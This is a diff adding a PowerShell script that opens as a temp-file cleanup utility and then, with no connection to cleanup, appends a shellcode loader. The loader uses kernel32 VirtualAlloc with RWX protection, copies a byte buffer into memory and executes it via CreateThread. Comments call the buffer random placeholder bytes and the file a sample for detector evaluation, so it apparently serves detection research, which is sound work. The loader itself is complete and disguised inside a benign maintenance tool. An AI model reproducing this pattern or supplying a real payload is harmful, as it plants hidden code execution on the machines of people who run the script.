@@ -1,0 +1,126 @@
+
+[CmdletBinding()]
+param(
+    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
+    [Alias("ScratchPath")]
+    [string]$TempRoot = $env:TEMP,
+
+    [Parameter(Mandatory = $false)]
+    [ValidateRange(1, 90)]
+    [int]$AgeDays = 7,
+    [int]$MinSizeMB = 10,
+
+    [string]$LogPath = "C:\Logs\temp-cleanup-2024-10-27.log",
+    [switch]$DryRun
+)
+
+
+if (-not (Test-Path -LiteralPath $TempRoot)) {
+    throw ("Temp path not found: {0}" -f $TempRoot)
+}
+$cutoff = (Get-Date).AddDays(-$AgeDays)
+$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
+$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
+$stale = $allFiles | Where-Object {
+    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
+}
+$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
+
+Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan
+
+foreach ($file in $stale) {
+    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
+        continue
+    }
+    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
+}
+$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
+    Measure-Object -Property Length -Sum).Sum / 1MB, 1)
+Write-Host ("After cleanup: {0} MB" -f $remainingMB) -ForegroundColor Green
+$line = "{0} reclaimed {1} MB from {2} files" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $reclaimMB, @($stale).Count
+Add-Content -Path $LogPath -Value $line -Encoding UTF8
+
+$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
+    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
+foreach ($dir in $emptyDirs) {
+    if ($dir.LastWriteTime -lt $cutoff) {
+        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
+    }
+}
+<#
+.SYNOPSIS
+    Loads a prepared binary buffer into committed memory and starts it
+    on a worker thread.
+
+.DESCRIPTION
+    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
+    into it, starts a thread and waits for completion. The buffer is a
+    placeholder supplied for static-analysis exercises.
+
+.NOTES
+    Sample generated for detector evaluation. No real payload is used.
+#>
+$NativeCode = @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class MemoryApi
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+        uint dwFreeType);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+        uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@
+
+Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+# buffer placeholder: random bytes, replaces the encrypted stage in real samples
+$Buffer = [Byte[]] @(
+    0x7a, 0xfd, 0x64, 0xe8, 0x8e, 0x84, 0xef, 0x7c, 0x18, 0x5e, 0x29, 0xda, 0x4e, 0xa5, 0xa7, 0x8a,
+    0x71, 0x21, 0x35, 0x79, 0xb9, 0xba, 0x20, 0x3f, 0xb6, 0x3f, 0xd2, 0xdc, 0x4f, 0xf4, 0xd8, 0x31,
+    0x80, 0x23, 0x8a, 0x6d, 0x75, 0x7f, 0x9e, 0xd7, 0xb2, 0x74, 0x61, 0x12, 0x7b, 0xc5, 0xf0, 0x4c,
+    0xd7, 0x3e, 0x38, 0x6e, 0xb4, 0xe9, 0x86, 0xb0, 0x0a, 0xbf, 0x79, 0x7b, 0xca, 0x4e, 0x17, 0xde,
+    0x24, 0xdc, 0x5e, 0x79, 0x67, 0xe3, 0x1a, 0x7d, 0x29, 0xb3, 0x40, 0xf8, 0x76, 0x1e, 0xdb, 0x1f,
+    0x96, 0x29, 0x82, 0x6f, 0x76, 0x28, 0x0d, 0x50, 0x95, 0xa7, 0xa5, 0x3f, 0x47, 0x10, 0xe9, 0xff,
+    0x33, 0x71, 0x4c, 0xbb, 0x23, 0x27, 0x7a, 0x09, 0x77, 0xe6, 0x1d, 0xe0, 0xda, 0x97, 0x3a, 0xd2,
+    0x02, 0x39, 0x8e, 0x8e, 0x9e, 0x00, 0xd1, 0xbf, 0x40, 0xc5, 0xa6, 0x0a, 0x57, 0xdd, 0x88, 0x84,
+    0x2e, 0x99, 0xcd, 0xa3, 0xdc, 0x7a, 0x99, 0xa0, 0x42, 0x0c, 0x2d, 0x3c, 0xa3, 0x26, 0xfa, 0x77,
+    0xa6, 0x6f, 0x6e, 0x00, 0xc8, 0xa5, 0x6b, 0x6a, 0x31, 0xc7, 0x87, 0x7d, 0xcc, 0x88, 0xd2, 0x16,
+    0x36, 0x78, 0x57, 0x15, 0x1c, 0xf7, 0xff, 0xaa, 0xc2, 0xeb, 0x43, 0x57, 0x0d, 0x66, 0x21, 0x4e,
+    0x72, 0x08, 0xf2, 0xee, 0x00, 0xff, 0x0f, 0x40, 0xbe, 0x6d, 0xba, 0x40, 0x6b, 0xb8, 0x24, 0xd8,
+    0xac, 0x4c, 0x1f, 0x6d, 0x82, 0xf6, 0x09, 0xe6, 0xed, 0x56, 0x76, 0x61, 0x49, 0x8c, 0xd9, 0xe3,
+    0x1f, 0x0f, 0x9a, 0xdb, 0x6a, 0x52, 0x34, 0xda, 0xc4, 0x0c, 0x22, 0x7d, 0x1d, 0x49, 0xbe, 0x0b,
+    0x8a, 0xb6, 0xeb, 0xab, 0xbb, 0x70, 0x36, 0x7a, 0x8a, 0xb7, 0x75, 0x80, 0x42, 0xfe, 0x59, 0x1d,
+    0xca, 0xe6, 0x97, 0x38, 0x58, 0xee, 0xdc, 0x51, 0xf3, 0x3d, 0x1b, 0x0d, 0x86, 0x63, 0x75, 0xe9,
+    0xa1, 0x81, 0xf5, 0xc5, 0xc2, 0x4b, 0x80, 0x46, 0x01, 0x84, 0xd1, 0x08, 0xc6, 0xa6, 0x36, 0x79
+)
+
+$MemoryHandle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+if ($MemoryHandle -eq [IntPtr]::Zero) {
+    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+    return
+}
+
+[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
+$ThreadId = 0
+$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+[void][MemoryApi]::WaitForSingleObject($Thread, 4615)
+[void][MemoryApi]::CloseHandle($Thread)
+
+$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
